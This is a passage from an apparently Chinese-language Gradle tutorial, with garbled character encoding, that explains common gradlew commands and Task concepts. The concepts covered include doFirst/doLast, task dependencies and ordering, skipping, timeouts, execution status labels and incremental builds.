 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">app</span> <span class="hljs-string">å¼€å§‹é…ç½®</span>
 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">app</span> <span class="hljs-string">é…ç½®å®Œæˆ</span>
    <span class="hljs-attr">Tasks:</span> <span class="hljs-number">35</span> <span class="hljs-string">|</span> <span class="hljs-attr">Configurations:</span> <span class="hljs-number">140</span>

<span class="hljs-string">&gt;</span> <span class="hljs-string">Configure</span> <span class="hljs-string">project</span> <span class="hljs-string">:GroovyLibrary</span>

 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">GroovyLibrary</span> <span class="hljs-string">å¼€å§‹é…ç½®</span>
 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">GroovyLibrary</span> <span class="hljs-string">é…ç½®å®Œæˆ</span>
    <span class="hljs-attr">Tasks:</span> <span class="hljs-number">33</span> <span class="hljs-string">|</span> <span class="hljs-attr">Configurations:</span> <span class="hljs-number">80</span>

<span class="hljs-string">&gt;</span> <span class="hljs-string">Configure</span> <span class="hljs-string">project</span> <span class="hljs-string">:KtsLibrary</span>

 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">KtsLibrary</span> <span class="hljs-string">å¼€å§‹é…ç½®</span>

  [<span class="hljs-string">KtsLibrary</span>] <span class="hljs-string">é…ç½®é˜¶æ®µå¼€å§‹</span>
 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">KtsLibrary</span> <span class="hljs-string">é…ç½®å®Œæˆ</span>
    <span class="hljs-attr">Tasks:</span> <span class="hljs-number">34</span> <span class="hljs-string">|</span> <span class="hljs-attr">Configurations:</span> <span class="hljs-number">80</span>
 [<span class="hljs-string">KtsLibrary</span>] <span class="hljs-string">é…ç½®å®Œæˆï¼Œè€—æ—¶ï¼š21ms</span>
    <span class="hljs-string">Android</span> <span class="hljs-string">é…ç½®ï¼š</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">compileSdk:</span> <span class="hljs-number">35</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">minSdk:</span> <span class="hljs-number">24</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">targetSdk:</span> <span class="hljs-literal">null</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">versionCode:</span> <span class="hljs-literal">null</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">versionName:</span> <span class="hljs-literal">null</span>

 [<span class="hljs-string">é…ç½®é˜¶æ®µ</span>] <span class="hljs-string">æ‰€æœ‰é¡¹ç›®é…ç½®å®Œæˆ</span>
   <span class="hljs-string">æ€»</span> <span class="hljs-string">Task</span> <span class="hljs-string">æ•°é‡ï¼š687</span>

 [<span class="hljs-string">æ‰§è¡Œé˜¶æ®µ</span>] <span class="hljs-string">Task</span> <span class="hljs-string">æ‰§è¡Œè®¡åˆ’</span>
<span class="hljs-string">å°†æ‰§è¡Œ</span> <span class="hljs-number">1</span> <span class="hljs-string">ä¸ª</span> <span class="hljs-string">Taskï¼š</span>

 <span class="hljs-attr">GradleY:</span>
   <span class="hljs-string">âœ“</span> <span class="hljs-string">prepareKotlinBuildScriptModel</span>


<span class="hljs-string">&gt;</span> <span class="hljs-string">Task</span> <span class="hljs-string">:prepareKotlinBuildScriptModel</span> <span class="hljs-string">UP-TO-DATE</span>
  [<span class="hljs-string">æ‰§è¡Œ</span>] <span class="hljs-string">å¼€å§‹ï¼š:prepareKotlinBuildScriptModel</span>
 <span class="hljs-string">æˆåŠŸ</span> [<span class="hljs-string">æ‰§è¡Œ</span>] <span class="hljs-string">å®Œæˆï¼š:prepareKotlinBuildScriptModel</span> <span class="hljs-string">(è·³è¿‡)</span>
<span class="hljs-string">Download</span> <span class="hljs-string">https://maven.aliyun.com/repository/public/javax/inject/javax.inject/1/javax.inject-1-javadoc.jar,</span> <span class="hljs-string">took</span> <span class="hljs-number">36</span> <span class="hljs-string">ms</span>

 <span class="hljs-string">Gradle</span> <span class="hljs-string">æ„å»ºæˆåŠŸ</span>

<span class="hljs-string">BUILD</span> <span class="hljs-string">SUCCESSFUL</span> <span class="hljs-string">in</span> <span class="hljs-string">24s</span>
</code></pre>
<p>å¦‚æœæƒ³æŸ¥çœ‹aar æ‰§è¡Œæƒ…å†µå¯ä»¥è¾“å‡º <code>./gradlew :KtsLibrary:assemble --no-daemon</code> ï¼ˆgradlewå³Gradle Wrapperçš„ç®€å†™ï¼‰</p>
<h2 data-id="heading-4">å¸¸ç”¨å‘½ä»¤</h2>
<p>ä¸‹åˆ—ä¸»è¦æ˜¯è‡ªå·±å¹³æ—¶ä½¿ç”¨åˆ°çš„å‘½ä»¤ï¼Œæœ‰æ—¶å€™ä¼šå¿˜è®°ï¼Œè¿™é‡Œä¹Ÿæå¸¦ä¸Š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹ Gradle ç‰ˆæœ¬</span>
./gradlew --version

<span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å¯ç”¨ Task</span>
./gradlew tasks

<span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰ Taskï¼ˆåŒ…æ‹¬éšè—çš„ï¼‰</span>
./gradlew tasks --all

<span class="hljs-comment"># æŸ¥çœ‹é¡¹ç›®ç»“æ„</span>
./gradlew projects

<span class="hljs-comment"># æ¸…ç†æ„å»ºäº§ç‰©</span>
./gradlew clean

<span class="hljs-comment"># æ¸…ç†å¹¶æ„å»º</span>
./gradlew clean build

========  Android æ„å»º ==========
<span class="hljs-comment"># æ„å»ºæ‰€æœ‰å˜ä½“</span>
./gradlew assemble

<span class="hljs-comment"># æ„å»º Debug ç‰ˆæœ¬</span>
./gradlew assembleDebug

<span class="hljs-comment"># æ„å»ºå¤±è´¥æ—¶ï¼ŒæŸ¥çœ‹è¯¦ç»†é”™è¯¯</span>
./gradlew assembleDebug --info --stacktrace

<span class="hljs-comment"># æ„å»º Release ç‰ˆæœ¬</span>
./gradlew assembleRelease

<span class="hljs-comment"># å®‰è£… Debug ç‰ˆæœ¬</span>
./gradlew installDebug

<span class="hljs-comment"># å®‰è£… Release ç‰ˆæœ¬</span>
./gradlew installRelease

<span class="hljs-comment"># å¸è½½ Debug ç‰ˆæœ¬</span>
./gradlew uninstallDebug

<span class="hljs-comment"># å¸è½½ Release ç‰ˆæœ¬</span>
./gradlew uninstallRelease

===========  æŸ¥çœ‹ä¾èµ– ==========
<span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰ä¾èµ– å¹¶è¾“å‡ºåˆ°æ–‡ä»¶ä¸­</span>
./gradlew app:dependencies &gt; dependencies.txt

<span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šé…ç½®çš„ä¾èµ–</span>
./gradlew :app:dependencies --configuration implementation
./gradlew :app:dependencies --configuration debugRuntimeClasspath

<span class="hljs-comment"># æŸ¥çœ‹ä¾èµ–æ ‘ï¼Œæ‰¾ (*) æ ‡è®°</span>
./gradlew :app:dependencies --configuration debugRuntimeClasspath | grep <span class="hljs-string">"(*)"</span>

<span class="hljs-comment"># æŸ¥çœ‹å…·ä½“çš„ä¾èµ–è·¯å¾„</span>
./gradlew :app:dependencyInsight --dependency okhttp --configuration debugRuntimeClasspath

<span class="hljs-comment"># æŸ¥çœ‹ä»»åŠ¡</span>
./gradlew tasks

</code></pre>
<p>è¿˜æœ‰ä¸€äº›å¯ä»¥è‡ªå·±æ‹¼æ¥åœ¨åè¾¹çš„ é‡è¦å‚æ•°</p>
<pre><code class="hljs language-gradle" lang="gradle"># è°ƒè¯•
--info                   # è¯¦ç»†ä¿¡æ¯
--stacktrace            # æ ˆè¿½è¸ª
--scan                  # æ„å»ºæ‰«æ

# æ€§èƒ½
--parallel              # å¹¶è¡Œ
--build-cache           # æ„å»ºç¼“å­˜
--configuration-cache   # é…ç½®ç¼“å­˜
</code></pre>
<p>è¿™é‡Œåªæ˜¯ç®€å•å¡äº†ä¸€äº› å¸¸ç”¨çš„å‘½ä»¤</p>
<h2 data-id="heading-5">Task ä»»åŠ¡</h2>
<h3 data-id="heading-6">Task åŸºæœ¬æ¦‚å¿µ</h3>
<p>â€ƒâ€ƒTaskï¼ˆä»»åŠ¡ï¼‰æ˜¯Gradleä¸­æœ€å°çš„æ„å»ºå•å…ƒï¼Œä½†æ˜¯ Taskä¸­åˆä¼šæœ‰å¾ˆå¤šçš„Action æ˜¯Taskä¸­æœ€å°çš„æ‰§è¡Œå•å…ƒã€‚ Gradle æ„å»ºçš„æ ¸å¿ƒæ˜¯ç”±Taskç»„æˆçš„<strong>æœ‰å‘æ— ç¯å›¾</strong>ï¼Œæ‰€ä»¥ å„ä¸ªTaskä¹‹é—´æ˜¯æœ‰è¿è¡Œé¡ºåºçš„ï¼Œä¸ä¼šå‡ºç°å¾ªç¯ä¾èµ–ç­‰é—®é¢˜ã€‚ Taskå±äº Projectå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥æ”¾åœ¨æ ¹ç›®å½•æˆ–è€…å­ç›®å½•çš„ build.gradle.ktsæ–‡ä»¶ä¸­ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b732c105bdc45bfbeecd6aaedc18441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO5bed:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765781061&amp;x-signature=VnGGd1cfRLhPCnz1XRkUnuGAHSY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">Task ä½¿ç”¨</h3>
<p>åˆ›å»º ï¼ˆæ¨èä½¿ç”¨register æ‡’åŠ è½½ï¼‰</p>
<pre><code class="hljs language-kotlin" lang="kotlin">register(String name, Action&lt;? <span class="hljs-keyword">super</span> Task&gt; configurationAction)
register(String name, Class type, Action&lt;? <span class="hljs-keyword">super</span> T&gt; configurationAction)

<span class="hljs-comment">// æœ€ç®€å•çš„Task  ä¸æ¨èä½¿ç”¨ create ç›´æ¥åˆ›å»º </span>
tasks.register(<span class="hljs-string">"hello"</span>) {
    doLast {
        println(it.name + <span class="hljs-string">" Gradle!"</span>)
    }
}

<span class="hljs-comment">// å¸¦ç±»å‹çš„Task å…¶ä»–çš„è¿˜æœ‰ Deleteã€Zipã€Jarç­‰ç±»å‹</span>
tasks.register&lt;Copy&gt;(<span class="hljs-string">"copyFiles"</span>) {
    from(<span class="hljs-string">"src/main/resources"</span>)
    into(<span class="hljs-string">"build/resources"</span>)
}

<span class="hljs-comment">// å¸¦é…ç½®çš„Task</span>
tasks.register(<span class="hljs-string">"printInfo"</span>) {
    group = <span class="hljs-string">"custom"</span>
    description = <span class="hljs-string">"æ‰“å°é¡¹ç›®ä¿¡æ¯"</span>
    
    doLast {
        println(<span class="hljs-string">"Project: <span class="hljs-subst">${project.name}</span>"</span>)
        println(<span class="hljs-string">"Version: <span class="hljs-subst">${project.version}</span>"</span>)
    }
}

<span class="hljs-comment">// ä½¿ç”¨æ¡ˆä¾‹</span>
./gradlew hello
<span class="hljs-comment">// ä¹Ÿå¯ä»¥å¤šä¸ªTask æ‰§è¡Œ  ï¼ˆä½†æ˜¯Task çš„å‘½åæ˜¯ä¸èƒ½é‡å¤çš„ï¼‰</span>
./gradlew task1 task2 task3
</code></pre>
<h3 data-id="heading-8">doFirst å’Œ doLast</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"greeting"</span>) {
    <span class="hljs-comment">// doLastï¼šåœ¨æœ€åæ‰§è¡Œ</span>
    doLast {
        println(<span class="hljs-string">"3. Goodbye!"</span>)
    }
    
    <span class="hljs-comment">// doFirstï¼šåœ¨æœ€å‰é¢æ‰§è¡Œ</span>
    doFirst {
        println(<span class="hljs-string">"2. Hello!"</span>)
    }
    
    <span class="hljs-comment">// å†æ·»åŠ ä¸€ä¸ªdoLast  æœ€åæ·»åŠ çš„ doLast æœ€åæ‰§è¡Œ</span>
    doLast {
        println(<span class="hljs-string">"4. See you!"</span>)
    }
    
    <span class="hljs-comment">// å†æ·»åŠ ä¸€ä¸ªdoFirst   æœ€åæ·»åŠ çš„ doFirstç¬¬ä¸€ä¸ªæ‰§è¡Œ</span>
    doFirst {
        println(<span class="hljs-string">"1. Welcome!"</span>)
    }
}
</code></pre>
<p>è¿è¡Œç»“æœ</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-quote">&gt; Task :greeting</span>
<span class="hljs-bullet">1.</span> Welcome!
<span class="hljs-bullet">2.</span> Hello!
<span class="hljs-bullet">3.</span> Goodbye!
<span class="hljs-bullet">4.</span> See you!
</code></pre>
<h3 data-id="heading-9">è‡ªå®šä¹‰Task</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreetingTask</span> : <span class="hljs-type">DefaultTask</span>() {
    
    <span class="hljs-meta">@Input</span>
    <span class="hljs-keyword">var</span> greeting: String = <span class="hljs-string">"Hello"</span>
    
    <span class="hljs-meta">@Input</span>
    <span class="hljs-keyword">var</span> name: String = <span class="hljs-string">"World"</span>
    
    <span class="hljs-meta">@TaskAction</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">greet</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$greeting</span>, <span class="hljs-variable">$name</span>!"</span>)
    }
}

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰Task</span>
tasks.register&lt;GreetingTask&gt;(<span class="hljs-string">"greet"</span>) {
    greeting = <span class="hljs-string">"ä½ å¥½"</span>
    name = <span class="hljs-string">"Gradle"</span>
}
</code></pre>
<h3 data-id="heading-10">Task å¸¸ç”¨å±æ€§</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"myTask"</span>) {
    <span class="hljs-comment">// ä»»åŠ¡åç§°ï¼ˆåªè¯»ï¼‰</span>
    println(<span class="hljs-string">"Task name: <span class="hljs-variable">$name</span>"</span>)
    <span class="hljs-comment">// ä»»åŠ¡åˆ†ç»„</span>
    group = <span class="hljs-string">"custom"</span>
    <span class="hljs-comment">// ä»»åŠ¡æè¿°</span>
    description = <span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ä»»åŠ¡"</span>
    <span class="hljs-comment">// æ˜¯å¦å¯ç”¨</span>
    enabled = <span class="hljs-literal">true</span>
    <span class="hljs-comment">// è¶…æ—¶æ—¶é—´</span>
    timeout.<span class="hljs-keyword">set</span>(Duration.ofMinutes(<span class="hljs-number">5</span>))
    <span class="hljs-comment">// ä¾èµ–çš„Task</span>
    dependsOn(<span class="hljs-string">"clean"</span>)
    doLast {
        println(<span class="hljs-string">"Executing <span class="hljs-variable">$name</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-11">Taskä¾èµ–å…³ç³»</h3>
<ul>
<li>dependsOnï¼ˆå¼ºä¾èµ–ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"taskA"</span>) {
    doLast {
        println(<span class="hljs-string">"æ‰§è¡Œ TaskA"</span>)
    }
}

tasks.register(<span class="hljs-string">"taskB"</span>) {
    doLast {
        println(<span class="hljs-string">"æ‰§è¡Œ TaskB"</span>)
    }
}

tasks.register(<span class="hljs-string">"taskC"</span>) {
    <span class="hljs-comment">// taskCä¾èµ–taskAå’ŒtaskB</span>
    dependsOn(<span class="hljs-string">"taskA"</span>, <span class="hljs-string">"taskB"</span>)
    
    doLast {
        println(<span class="hljs-string">"æ‰§è¡Œ TaskC"</span>)
    }
}
</code></pre>
<p><strong>æ‰§è¡Œ <code>./gradlew taskC</code></strong>ï¼š æ˜¯å¿…é¡»å…ˆæ‰§è¡Œä¾èµ–é¡¹çš„ï¼Œ æœ‰å‘æ— ç¯çš„</p>
<pre><code class="hljs language-arduino" lang="arduino">&gt; <span class="hljs-built_in">Task</span> :taskA
æ‰§è¡Œ TaskA

&gt; <span class="hljs-built_in">Task</span> :taskB
æ‰§è¡Œ TaskB

&gt; <span class="hljs-built_in">Task</span> :taskC
æ‰§è¡Œ TaskC
</code></pre>
<ul>
<li>mustRunAfter ï¼ˆåœ¨è°ä¹‹å å¿…é¡»çš„ï¼Œä¼šæŠ¥é”™çš„é‚£ç§ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"compile"</span>) {
    doLast {
        println(<span class="hljs-string">"ç¼–è¯‘ä»£ç "</span>)
    }
}

tasks.register(<span class="hljs-string">"test"</span>) {
    <span class="hljs-comment">// å¦‚æœtestè¦æ‰§è¡Œï¼Œå¿…é¡»åœ¨compileä¹‹å</span>
    mustRunAfter(<span class="hljs-string">"compile"</span>)
    
    doLast {
        println(<span class="hljs-string">"è¿è¡Œæµ‹è¯•"</span>)
    }
}
</code></pre>
<p><strong>æ‰§è¡Œ <code>./gradlew compile test</code></strong>ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash">Task :compile</span>
ç¼–è¯‘ä»£ç 
<span class="hljs-meta prompt_">
&gt; </span><span class="bash">Task :<span class="hljs-built_in">test</span></span>
è¿è¡Œæµ‹è¯•
</code></pre>
<p><strong>æ‰§è¡Œ <code>./gradlew test compile</code></strong>ï¼ˆé¡ºåºç›¸åï¼‰ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash">Task :compile  â† ä¾ç„¶å…ˆæ‰§è¡Œcompile</span>
ç¼–è¯‘ä»£ç 
<span class="hljs-meta prompt_">
&gt; </span><span class="bash">Task :<span class="hljs-built_in">test</span></span>
è¿è¡Œæµ‹è¯•
</code></pre>
<p><strong>åªæ‰§è¡Œ <code>./gradlew test</code></strong>ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash">Task :<span class="hljs-built_in">test</span>  â† åªæ‰§è¡Œ<span class="hljs-built_in">test</span>ï¼Œä¸ä¼šè‡ªåŠ¨æ‰§è¡Œcompile</span>
è¿è¡Œæµ‹è¯•
</code></pre>
<ul>
<li>shouldRunAfter ï¼ˆåœ¨è°ä¹‹å  ä¸å¼ºåˆ¶ï¼Œä¸ä¼šæŠ¥é”™ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"taskA"</span>) {
    doLast {
        println(<span class="hljs-string">"TaskA"</span>)
    }
}

tasks.register(<span class="hljs-string">"taskB"</span>) {
    <span class="hljs-comment">// å»ºè®®åœ¨taskAä¹‹åæ‰§è¡Œ</span>
    shouldRunAfter(<span class="hljs-string">"taskA"</span>)
    
    doLast {
        println(<span class="hljs-string">"TaskB"</span>)
    }
}
</code></pre>
<ul>
<li>finalizedBy  ï¼ˆç»“æŸåæ‰§è¡Œ æŸTaskï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"buildApp"</span>) {
    <span class="hljs-comment">// æ„å»ºå®Œæˆåï¼Œå¿…é¡»æ‰§è¡Œæ¸…ç†</span>
    finalizedBy(<span class="hljs-string">"cleanup"</span>)
    
    doLast {
        println(<span class="hljs-string">"æ„å»ºåº”ç”¨"</span>)
    }
}

tasks.register(<span class="hljs-string">"cleanup"</span>) {
    doLast {
        println(<span class="hljs-string">"æ¸…ç†ä¸´æ—¶æ–‡ä»¶"</span>)
    }
}
</code></pre>
<p><strong>æ‰§è¡Œ <code>./gradlew buildApp</code></strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">&gt; <span class="hljs-built_in">Task</span> :buildApp
æ„å»ºåº”ç”¨

&gt; <span class="hljs-built_in">Task</span> :cleanup
æ¸…ç†ä¸´æ—¶æ–‡ä»¶
</code></pre>
<h3 data-id="heading-12">Taskè·³è¿‡</h3>
<ul>
<li>onlyIf  ï¼ˆæ¡ä»¶è·³è¿‡ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"deployProd"</span>) {
    <span class="hljs-comment">// åªæœ‰åœ¨ç”Ÿäº§ç¯å¢ƒæ‰æ‰§è¡Œ</span>
    onlyIf {
        project.hasProperty(<span class="hljs-string">"prod"</span>)
    }
    
    doLast {
        println(<span class="hljs-string">"éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ"</span>)
    }
}
</code></pre>
<p><strong>æ‰§è¡Œ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">// ä¸ä¼šæ‰§è¡Œ
./gradlew deployProd

// ä¼šæ‰§è¡Œ
./gradlew deployProd -Pprod
</code></pre>
<ul>
<li>StopExecutionException ï¼ˆå¼‚å¸¸è·³è¿‡ï¼‰</li>
<li>enabled</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"oldTask"</span>) {
    <span class="hljs-comment">// ç¦ç”¨è¿™ä¸ªTask</span>
    enabled = <span class="hljs-literal">false</span>
    
    doLast {
        println(<span class="hljs-string">"è¿™ä¸ªTaskå·²è¢«ç¦ç”¨"</span>)
    }
}
</code></pre>
<ul>
<li>timeout   ï¼ˆè¶…æ—¶è·³è¿‡ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"longRunningTask"</span>) {
    timeout.<span class="hljs-keyword">set</span>(Duration.ofSeconds(<span class="hljs-number">10</span>))
    
    doLast {
        println(<span class="hljs-string">"å¼€å§‹æ‰§è¡Œé•¿æ—¶é—´ä»»åŠ¡"</span>)
        Thread.sleep(<span class="hljs-number">15000</span>)
        println(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>)
    }
}
</code></pre>
<p><strong>æ‰§è¡Œç»“æœï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Execution failed <span class="hljs-keyword">for</span> task <span class="hljs-string">':longRunningTask'</span>.
&gt; Timeout has been exceeded
</code></pre>
<h3 data-id="heading-13">Taskæ‰§è¡ŒçŠ¶æ€</h3>
<p>è¿è¡Œé¡¹ç›® æœ‰äº›Taskåè¾¹ä¼šå¸¦ä¸€äº›å¤§å†™åç¼€ï¼Œä½†æ˜¯æœ‰äº›Taskå¯èƒ½åè¾¹æ²¡æœ‰ï¼Œ<strong>ä¸€èˆ¬æ˜¯æŒ‡è¿è¡Œè¯´æ˜</strong></p>
<pre><code class="hljs language-ruby" lang="ruby">&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:LiveBundle</span><span class="hljs-symbol">:LiveAudience</span><span class="hljs-symbol">:mergeReleaseNativeLibs</span> <span class="hljs-variable constant_">NO</span>-<span class="hljs-variable constant_">SOURCE</span>
&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:LiveBundle</span><span class="hljs-symbol">:LiveAudience</span><span class="hljs-symbol">:stripReleaseDebugSymbols</span> <span class="hljs-variable constant_">NO</span>-<span class="hljs-variable constant_">SOURCE</span>
&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:LiveBundle</span><span class="hljs-symbol">:LiveAudience</span><span class="hljs-symbol">:copyReleaseJniLibsProjectOnly</span> <span class="hljs-variable constant_">UP</span>-<span class="hljs-variable constant_">TO</span>-<span class="hljs-variable constant_">DATE</span>
&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:TingMainHost</span><span class="hljs-symbol">:Application</span><span class="hljs-symbol">:mergeAnd-f5-ocpaReleaseAssets</span> <span class="hljs-variable constant_">FROM</span>-<span class="hljs-variable constant_">CACHE</span>
&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:LiveBundle</span><span class="hljs-symbol">:Anchor</span><span class="hljs-symbol">:compileReleaseKotlin</span> <span class="hljs-variable constant_">UP</span>-<span class="hljs-variable constant_">TO</span>-<span class="hljs-variable constant_">DATE</span>
&gt; <span class="hljs-title class_">Task</span> <span class="hljs-symbol">:LiveBundle</span><span class="hljs-symbol">:LiveHome</span><span class="hljs-symbol">:compileReleaseKotlin</span> <span class="hljs-variable constant_">UP</span>-<span class="hljs-variable constant_">TO</span>-<span class="hljs-variable constant_">DATE</span>
</code></pre>



































<table><thead><tr><th>æ ‡ç­¾</th><th>è¯´æ˜</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td><strong>(æ— æ ‡ç­¾)</strong></td><td>Taskæ­£å¸¸æ‰§è¡Œ</td><td>ç¼–è¯‘ã€æ‰“åŒ…ç­‰</td></tr><tr><td><code>UP-TO-DATE</code></td><td>è¾“å…¥è¾“å‡ºæœªæ”¹å˜ï¼Œè·³è¿‡æ‰§è¡Œ</td><td>å¢é‡æ„å»º</td></tr><tr><td><code>FROM-CACHE</code></td><td>ä»æ„å»ºç¼“å­˜ä¸­å¤ç”¨ç»“æœ</td><td>å¼€å¯Build Cache</td></tr><tr><td><code>SKIPPED</code></td><td>Taskè¢«è·³è¿‡</td><td>æ¡ä»¶ä¸æ»¡è¶³ã€è¢«æ’é™¤</td></tr><tr><td><code>NO-SOURCE</code></td><td>æ²¡æœ‰æºæ–‡ä»¶éœ€è¦å¤„ç†</td><td>ç©ºçš„æºç ç›®å½•</td></tr></tbody></table>
<h3 data-id="heading-14">Taskå¢é‡æ„å»º</h3>
<p>â€ƒâ€ƒ<strong>å¢é‡æ„å»º</strong> æ˜¯å½“Taskçš„è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰å˜åŒ–æ—¶ï¼Œè·³è¿‡actionçš„æ‰§è¡Œï¼Œå½“Taskè¾“å…¥æˆ–è¾“å‡ºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œåœ¨actionä¸­åªå¯¹å‘ç”Ÿå˜åŒ–çš„è¾“å…¥æˆ–è¾“å‡ºè¿›è¡Œå¤„ç†ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ä¸€ä¸ªæ²¡æœ‰å˜åŒ–çš„Taskè¢«åå¤æ„å»ºï¼Œå½“Taskå‘ç”Ÿå˜åŒ–æ—¶ä¹Ÿåªå¤„ç†å˜åŒ–éƒ¨åˆ†ï¼Œè¿™æ ·å¯ä»¥æé«˜Gradleçš„æ„å»ºæ•ˆç‡ï¼Œç¼©çŸ­æ„å»ºæ—¶é—´ã€‚</p>
<p>Taskå¢é‡æ„å»ºåˆ¤æ–­æµç¨‹ï¼š</p>
<ol>
<li>æ£€æŸ¥è¾“å…¥æ˜¯å¦æ”¹å˜ï¼ˆæ–‡ä»¶å†…å®¹ã€å±æ€§å€¼ç­‰ï¼‰</li>
<li>æ£€æŸ¥è¾“å‡ºæ˜¯å¦å­˜åœ¨</li>
<li>å¦‚æœè¾“å…¥æœªå˜ä¸”è¾“å‡ºå­˜åœ¨ â†’ UP-TO-DATE</li>
<li>å¦åˆ™ â†’ é‡æ–°æ‰§è¡Œ</li>
</ol>
<p>æ¨¡æ‹Ÿç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IncrementalTask</span> : <span class="hljs-type">DefaultTask</span>() {
    
    <span class="hljs-meta">@InputFile</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> inputFile: RegularFileProperty
    
    <span class="hljs-meta">@OutputFile</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> outputFile: RegularFileProperty
    
    <span class="hljs-meta">@TaskAction</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> input = inputFile.<span class="hljs-keyword">get</span>().asFile
        <span class="hljs-keyword">val</span> output = outputFile.<span class="hljs-keyword">get</span>().asFile
        
        println(<span class="hljs-string">"å¤„ç†æ–‡ä»¶ï¼š<span class="hljs-subst">${input.name}</span>"</span>)
        
        <span class="hljs-comment">// è¯»å–è¾“å…¥ï¼Œå¤„ç†åå†™å…¥è¾“å‡º</span>
        <span class="hljs-keyword">val</span> content = input.readText()
        output.writeText(content.uppercase())
    }
}

tasks.register&lt;IncrementalTask&gt;(<span class="hljs-string">"processFile"</span>) {
    inputFile.<span class="hljs-keyword">set</span>(file(<span class="hljs-string">"input.txt"</span>))
    outputFile.<span class="hljs-keyword">set</span>(file(<span class="hljs-string">"build/output.txt"</span>))
}
</code></pre>
<p>é¦–æ¬¡æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ ./gradlew processFile

&gt; Task :processFile
å¤„ç†æ–‡ä»¶ï¼šinput.txt
</code></pre>
<p>å†æ¬¡æ‰§è¡Œï¼ˆinput.txtæœªæ”¹å˜ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ ./gradlew processFile
// å‘ç°æ–‡ä»¶æ²¡æœ‰æ”¹å˜ è·³è¿‡æ‰§è¡Œ
&gt; Task :processFile UP-TO-DATE   
</code></pre>
<p>ä¿®æ”¹input.txtåå†æ¬¡æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ ./gradlew processFile
// å‘ç°æ–‡ä»¶äº§ç”Ÿäº†æ”¹å˜  é‡æ–°æ‰§è¡Œ 
&gt; Task :processFile
å¤„ç†æ–‡ä»¶ï¼šinput.txt
</code></pre>
